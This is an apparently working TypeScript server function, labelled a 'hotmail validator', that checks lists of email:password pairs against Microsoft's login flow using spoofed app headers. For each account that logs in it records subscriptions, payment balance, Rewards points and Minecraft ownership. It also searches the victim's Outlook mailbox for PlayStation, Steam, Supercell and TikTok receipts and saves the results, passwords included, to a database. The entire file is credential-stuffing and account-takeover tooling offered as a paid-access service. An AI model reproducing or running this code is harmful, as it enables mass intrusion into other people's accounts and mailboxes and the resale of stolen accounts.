import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { firebasePush, firebaseGet, verifyFirebaseIdToken } from "../_shared/firebase-admin.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token",
};

interface SubscriptionInfo {
  name: string;
  category: string;
  daysRemaining?: string;
  autoRenew?: string;
  isExpired?: boolean;
}

interface CheckResult {
  email: string;
  password: string;
  status: string;
  country?: string;
  name?: string;
  inboxCount?: string;
  // Microsoft Subscriptions
  msStatus?: string;
  subscriptions?: SubscriptionInfo[];
  rewardsPoints?: string;
  balance?: string;
  // PSN
  psn?: {
    status: string;
    orders: number;
    purchases: any[];
  };
  // Steam
  steam?: {
    status: string;
    count: number;
    purchases?: any[];
  };
  // Supercell
  supercell?: {
    status: string;
    games: string[];
  };
  // TikTok
  tiktok?: {
    status: string;
    username?: string;
  };
  // Minecraft
  minecraft?: {
    status: string;
    username?: string;
    uuid?: string;
    capes?: string[];
  };
  error?: string;
}

// Check Microsoft Subscriptions (Xbox Game Pass, M365, etc)
async function checkMicrosoftSubscriptions(email: string, accessToken: string, cid: string): Promise<{
  status: string;
  subscriptions: SubscriptionInfo[];
  data: Record<string, string>;
}> {
  try {
    const userId = crypto.randomUUID().replace(/-/g, '').substring(0, 16);
    const stateJson = JSON.stringify({ userId, scopeSet: "pidl" });
    const paymentAuthUrl = `https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=${encodeURIComponent(stateJson)}&prompt=none`;
    
    const headers = {
      "Host": "login.live.com",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Connection": "keep-alive",
      "Referer": "https://account.microsoft.com/"
    };
    
    const r = await fetch(paymentAuthUrl, { headers, redirect: 'follow' });
    const searchText = (await r.text()) + " " + r.url;
    
    const tokenPatterns = [
      /access_token=([^&\s"']+)/,
      /"access_token":"([^"]+)"/
    ];
    
    let paymentToken = null;
    for (const pattern of tokenPatterns) {
      const match = searchText.match(pattern);
      if (match) {
        paymentToken = decodeURIComponent(match[1]);
        break;
      }
    }
    
    if (!paymentToken) {
      return { status: "FREE", subscriptions: [], data: {} };
    }
    
    const subData: Record<string, string> = {};
    const subscriptions: SubscriptionInfo[] = [];
    
    const paymentHeaders = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Accept": "application/json",
      "Authorization": `MSADELEGATE1.0="${paymentToken}"`,
      "Content-Type": "application/json",
      "Host": "paymentinstruments.mp.microsoft.com",
      "ms-cV": crypto.randomUUID(),
      "Origin": "https://account.microsoft.com",
      "Referer": "https://account.microsoft.com/"
    };
    
    // Check payment instruments for balance
    try {
      const payUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US";
      const rPay = await fetch(payUrl, { headers: paymentHeaders });
      if (rPay.ok) {
        const payText = await rPay.text();
        const balanceMatch = payText.match(/"balance"\s*:\s*([0-9.]+)/);
        if (balanceMatch) {
          subData.balance = "$" + balanceMatch[1];
        }
      }
    } catch {}
    
    // Check Bing Rewards
    try {
      const rewardsR = await fetch("https://rewards.bing.com/", { headers: { "User-Agent": headers["User-Agent"] } });
      const rewardsText = await rewardsR.text();
      const pointsMatch = rewardsText.match(/"availablePoints"\s*:\s*(\d+)/);
      if (pointsMatch) {
        subData.rewardsPoints = pointsMatch[1];
      }
    } catch {}
    
    // Check subscriptions
    try {
      const transUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions";
      const rSub = await fetch(transUrl, { headers: paymentHeaders });
      
      if (rSub.ok) {
        const responseText = await rSub.text();
        
        const subscriptionKeywords: Record<string, { type: string; category: string }> = {
          'Xbox Game Pass Ultimate': { type: 'GAME PASS ULTIMATE', category: 'gaming' },
          'PC Game Pass': { type: 'PC GAME PASS', category: 'gaming' },
          'Xbox Game Pass': { type: 'GAME PASS', category: 'gaming' },
          'EA Play': { type: 'EA PLAY', category: 'gaming' },
          'Xbox Live Gold': { type: 'XBOX LIVE GOLD', category: 'gaming' },
          'Microsoft 365 Family': { type: 'M365 FAMILY', category: 'office' },
          'Microsoft 365 Personal': { type: 'M365 PERSONAL', category: 'office' },
          'Office 365': { type: 'OFFICE 365', category: 'office' },
          'OneDrive': { type: 'ONEDRIVE', category: 'storage' }
        };
        
        for (const [keyword, info] of Object.entries(subscriptionKeywords)) {
          if (responseText.includes(keyword)) {
            const subInfo: SubscriptionInfo = {
              name: info.type,
              category: info.category
            };
            
            const renewalMatch = responseText.match(/"nextRenewalDate"\s*:\s*"([^T"]+)/);
            if (renewalMatch) {
              const renewalDate = renewalMatch[1];
              try {
                const renewal = new Date(renewalDate + "T00:00:00Z");
                const today = new Date();
                const daysRemaining = Math.floor((renewal.getTime() - today.getTime()) / (1000 * 60 * 60 * 24));
                subInfo.daysRemaining = String(daysRemaining);
                if (daysRemaining < 0) {
                  subInfo.isExpired = true;
                }
              } catch {}
            }
            
            const autoMatch = responseText.match(/"autoRenew"\s*:\s*(true|false)/);
            if (autoMatch) {
              subInfo.autoRenew = autoMatch[1] === "true" ? "YES" : "NO";
            }
            
            subscriptions.push(subInfo);
          }
        }
        
        if (subscriptions.length > 0) {
          const activeSubs = subscriptions.filter(s => !s.isExpired);
          if (activeSubs.length > 0) {
            return { status: "PREMIUM", subscriptions, data: subData };
          }
        }
      }
    } catch {}
    
    return { status: "FREE", subscriptions, data: subData };
    
  } catch (error) {
    console.error("MS subscription check error:", error);
    return { status: "ERROR", subscriptions: [], data: {} };
  }
}

// Check Minecraft account
async function checkMinecraft(accessToken: string): Promise<{
  status: string;
  username?: string;
  uuid?: string;
  capes?: string[];
}> {
  try {
    const r = await fetch('https://api.minecraftservices.com/minecraft/profile', {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'User-Agent': 'Outlook-Android/2.0'
      }
    });
    
    if (r.ok) {
      const data = await r.json();
      return {
        status: "OWNED",
        username: data.name || "Unknown",
        uuid: data.id || "",
        capes: (data.capes || []).map((cape: any) => cape.alias || "")
      };
    }
    
    return { status: "FREE" };
  } catch (error) {
    console.error("Minecraft check error:", error);
    return { status: "ERROR" };
  }
}

async function checkAccount(email: string, password: string, checkMode: string): Promise<CheckResult> {
  const result: CheckResult = { email, password, status: 'checking' };
  
  try {
    const uuid = crypto.randomUUID();
    
    // Step 1: Check if MSAccount
    const idpUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
    const idpRes = await fetch(idpUrl, {
      headers: {
        "X-OneAuth-AppName": "Outlook Lite",
        "X-Office-Version": "3.11.0-minApi24",
        "X-CorrelationId": uuid,
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
        "Host": "odc.officeapps.live.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
      }
    });
    
    const idpText = await idpRes.text();
    
    if (idpText.includes("Neither") || idpText.includes("Both") || 
        idpText.includes("Placeholder") || idpText.includes("OrgId")) {
      result.status = "invalid";
      result.error = "Not a Microsoft account";
      return result;
    }
    
    if (!idpText.includes("MSAccount")) {
      result.status = "invalid";
      result.error = "Not a Microsoft account";
      return result;
    }
    
    // Step 2: Get auth page
    const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
    
    const authRes = await fetch(authUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
      },
      redirect: 'follow'
    });
    
    const authText = await authRes.text();
    const finalUrl = authRes.url;
    
    // Extract PPFT and post URL
    const urlMatch = authText.match(/urlPost":"([^"]+)"/);
    const ppftMatch = authText.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);
    
    if (!urlMatch || !ppftMatch) {
      result.status = "error";
      result.error = "Failed to get auth tokens";
      return result;
    }
    
    const postUrl = urlMatch[1].replace(/\\\//g, "/");
    const ppft = ppftMatch[1];
    
    // Get cookies from response
    const cookies = authRes.headers.get("set-cookie") || "";
    
    // Step 3: Login
    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960`;
    
    const loginRes = await fetch(postUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Origin": "https://login.live.com",
        "Referer": finalUrl,
        "Cookie": cookies
      },
      redirect: 'manual'
    });
    
    const loginText = await loginRes.text();
    const loginLocation = loginRes.headers.get("location") || "";
    
    // Check for errors
    if (loginText.toLowerCase().includes("account or password is incorrect") || 
        (loginText.match(/error/gi) || []).length > 0) {
      result.status = "invalid";
      result.error = "Wrong password";
      return result;
    }
    
    if (loginText.includes("identity/confirm") || loginText.includes("Consent")) {
      result.status = "2fa";
      result.error = "2FA required";
      return result;
    }
    
    if (loginText.includes("account.live.com/Abuse")) {
      result.status = "locked";
      result.error = "Account locked";
      return result;
    }
    
    // Extract code from redirect
    const codeMatch = loginLocation.match(/code=([^&]+)/);
    if (!codeMatch) {
      result.status = "error";
      result.error = "No auth code received";
      return result;
    }
    
    const code = codeMatch[1];
    
    // Extract MSPCID from cookies
    const loginCookies = loginRes.headers.get("set-cookie") || "";
    const mspcidMatch = loginCookies.match(/MSPCID=([^;]+)/);
    const cid = mspcidMatch ? mspcidMatch[1].toUpperCase() : "";
    
    if (!cid) {
      result.status = "error";
      result.error = "No CID found";
      return result;
    }
    
    // Step 4: Get access token
    const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;
    
    const tokenRes = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: tokenData
    });
    
    const tokenJson = await tokenRes.json();
    
    if (!tokenJson.access_token) {
      result.status = "error";
      result.error = "Failed to get access token";
      return result;
    }
    
    const accessToken = tokenJson.access_token;
    result.status = "valid";
    
    // Step 5: Get profile info
    try {
      const profileRes = await fetch("https://substrate.office.com/profileb2/v2.0/me/V1Profile", {
        headers: {
          "User-Agent": "Outlook-Android/2.0",
          "Authorization": `Bearer ${accessToken}`,
          "X-AnchorMailbox": `CID:${cid}`
        }
      });
      
      if (profileRes.ok) {
        const profile = await profileRes.json();
        result.country = profile.location || "";
        result.name = profile.displayName || "";
      }
    } catch (e) {
      console.error("Profile fetch error:", e);
    }
    
    // Check Microsoft Subscriptions if requested
    if (checkMode === "microsoft" || checkMode === "all") {
      try {
        const msResult = await checkMicrosoftSubscriptions(email, accessToken, cid);
        result.msStatus = msResult.status;
        result.subscriptions = msResult.subscriptions;
        if (msResult.data.rewardsPoints) result.rewardsPoints = msResult.data.rewardsPoints;
        if (msResult.data.balance) result.balance = msResult.data.balance;
      } catch (e) {
        console.error("MS check error:", e);
      }
    }
    
    // Check Minecraft if requested
    if (checkMode === "minecraft" || checkMode === "all") {
      try {
        const mcResult = await checkMinecraft(accessToken);
        result.minecraft = mcResult;
      } catch (e) {
        console.error("Minecraft check error:", e);
      }
    }
    
    // Check PSN if requested
    if (checkMode === "psn" || checkMode === "all") {
      try {
        const psnPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
            "Size": 50,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const psnRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(psnPayload)
        });
        
        if (psnRes.ok) {
          const psnData = await psnRes.json();
          let orders = 0;
          const purchases: any[] = [];
          
          if (psnData.EntitySets?.[0]?.ResultSets?.[0]) {
            orders = psnData.EntitySets[0].ResultSets[0].Total || 0;
            
            const results = psnData.EntitySets[0].ResultSets[0].Results || [];
            for (const r of results.slice(0, 15)) {
              if (r.Preview) {
                const gamePatterns = [
                  /Thank you for purchasing\s+([^\.]+)/i,
                  /You've bought\s+([^\.]+)/i,
                  /Game:\s*([^\n\.]{3,60})/i
                ];
                for (const pattern of gamePatterns) {
                  const gameMatch = r.Preview.match(pattern);
                  if (gameMatch) {
                    purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
                    break;
                  }
                }
              }
            }
          }
          
          result.psn = {
            status: orders > 0 ? "HAS_ORDERS" : "FREE",
            orders,
            purchases
          };
        }
      } catch (e) {
        console.error("PSN check error:", e);
      }
    }
    
    // Check Steam if requested
    if (checkMode === "steam" || checkMode === "all") {
      try {
        const steamPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@steampowered.com purchase OR receipt"},
            "Size": 30,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const steamRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(steamPayload)
        });
        
        if (steamRes.ok) {
          const steamData = await steamRes.json();
          let count = 0;
          const purchases: any[] = [];
          
          if (steamData.EntitySets?.[0]?.ResultSets?.[0]) {
            count = steamData.EntitySets[0].ResultSets[0].Total || 0;
            
            const results = steamData.EntitySets[0].ResultSets[0].Results || [];
            for (const r of results.slice(0, 10)) {
              if (r.Subject) {
                purchases.push({ game: r.Subject.substring(0, 50) });
              }
            }
          }
          
          result.steam = {
            status: count > 0 ? "HAS_PURCHASES" : "FREE",
            count,
            purchases
          };
        }
      } catch (e) {
        console.error("Steam check error:", e);
      }
    }
    
    // Check Supercell if requested
    if (checkMode === "supercell" || checkMode === "all") {
      try {
        const supercellPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@id.supercell.com"},
            "Size": 20,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const supercellRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(supercellPayload)
        });
        
        if (supercellRes.ok) {
          const supercellData = await supercellRes.json();
          const games: string[] = [];
          
          if (supercellData.EntitySets?.[0]?.ResultSets?.[0]?.Results) {
            for (const r of supercellData.EntitySets[0].ResultSets[0].Results) {
              const preview = (r.Preview || "") + " " + (r.Subject || "");
              if ((preview.includes("Clash Royale") || preview.includes("Royale")) && !games.includes("Clash Royale")) {
                games.push("Clash Royale");
              }
              if ((preview.includes("Clash of Clans") || preview.includes("Clans")) && !games.includes("Clash of Clans")) {
                games.push("Clash of Clans");
              }
              if ((preview.includes("Brawl Stars") || preview.includes("Brawl")) && !games.includes("Brawl Stars")) {
                games.push("Brawl Stars");
              }
              if (preview.includes("Hay Day") && !games.includes("Hay Day")) {
                games.push("Hay Day");
              }
              if (preview.includes("Squad Busters") && !games.includes("Squad Busters")) {
                games.push("Squad Busters");
              }
            }
          }
          
          result.supercell = {
            status: games.length > 0 ? "LINKED" : "FREE",
            games
          };
        }
      } catch (e) {
        console.error("Supercell check error:", e);
      }
    }
    
    // Check TikTok if requested
    if (checkMode === "tiktok" || checkMode === "all") {
      try {
        const tiktokPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "account.tiktok"},
            "Size": 10,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const tiktokRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(tiktokPayload)
        });
        
        if (tiktokRes.ok) {
          const tiktokData = await tiktokRes.json();
          let username = null;
          
          if (tiktokData.EntitySets?.[0]?.ResultSets?.[0]?.Results) {
            for (const r of tiktokData.EntitySets[0].ResultSets[0].Results) {
              const preview = r.Preview || "";
              const patterns = [
                /Hi\s+([^,]+)/,
                /Hello\s+([^,]+)/,
                /Salut\s+([^,]+)/,
                /Hallo\s+([^,]+)/,
                /Xin chào\s+([^,]+)/
              ];
              for (const p of patterns) {
                const m = preview.match(p);
                if (m) {
                  username = m[1].trim();
                  break;
                }
              }
              if (username) break;
            }
          }
          
          result.tiktok = {
            status: username ? "LINKED" : "FREE",
            username: username || undefined
          };
        }
      } catch (e) {
        console.error("TikTok check error:", e);
      }
    }
    
    return result;
    
  } catch (error) {
    console.error("Check error:", error);
    result.status = "error";
    result.error = String(error);
    return result;
  }
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Verify Firebase auth token
    const firebaseToken = req.headers.get("x-firebase-token");
    let userId: string | null = null;
    let userEmail: string | null = null;
    
    if (firebaseToken) {
      const tokenData = await verifyFirebaseIdToken(firebaseToken);
      if (tokenData) {
        userId = tokenData.uid;
        userEmail = tokenData.email || null;
      }
    }

    const { accounts, checkMode = "all", threads = 5, saveHistory = true } = await req.json();

    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "No accounts provided" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Check if user has service access (if authenticated)
    if (userId) {
      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
      const hasAccess = userData?.services?.includes("hotmail_validator") || 
                        userData?.services?.includes("all") ||
                        userData?.isAdmin;
      
      if (!hasAccess) {
        return new Response(
          JSON.stringify({ error: "You don't have access to this service" }),
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    const results: CheckResult[] = [];
    const stats = {
      total: accounts.length,
      valid: 0,
      invalid: 0,
      twoFa: 0,
      locked: 0,
      error: 0,
      msPremium: 0,
      msFree: 0,
      psnHits: 0,
      steamHits: 0,
      supercellHits: 0,
      tiktokHits: 0,
      minecraftHits: 0
    };

    // Process accounts in batches
    const batchSize = Math.min(threads, 10);
    for (let i = 0; i < accounts.length; i += batchSize) {
      const batch = accounts.slice(i, i + batchSize);
      
      const batchResults = await Promise.all(
        batch.map(async (account: string) => {
          const [email, password] = account.split(":");
          if (!email || !password) {
            return { email: account, password: "", status: "error", error: "Invalid format" } as CheckResult;
          }
          return await checkAccount(email.trim(), password.trim(), checkMode);
        })
      );
      
      for (const r of batchResults) {
        results.push(r);
        
        if (r.status === "valid") stats.valid++;
        else if (r.status === "invalid") stats.invalid++;
        else if (r.status === "2fa") stats.twoFa++;
        else if (r.status === "locked") stats.locked++;
        else stats.error++;
        
        // MS Premium/Free
        if (r.msStatus === "PREMIUM") stats.msPremium++;
        else if (r.msStatus === "FREE" || r.subscriptions?.length === 0) stats.msFree++;
        
        if (r.psn?.status === "HAS_ORDERS") stats.psnHits++;
        if (r.steam?.status === "HAS_PURCHASES") stats.steamHits++;
        if (r.supercell?.status === "LINKED") stats.supercellHits++;
        if (r.tiktok?.status === "LINKED") stats.tiktokHits++;
        if (r.minecraft?.status === "OWNED") stats.minecraftHits++;
      }
    }

    // Save history to Firebase if user is authenticated
    if (userId && saveHistory) {
      await firebasePush('checkHistory', {
        userId,
        service: "hotmail_validator",
        checkMode,
        inputCount: accounts.length,
        stats,
        results,
        createdAt: new Date().toISOString()
      });
    }

    return new Response(
      JSON.stringify({ results, stats }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );

  } catch (error) {
    console.error("Error:", error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
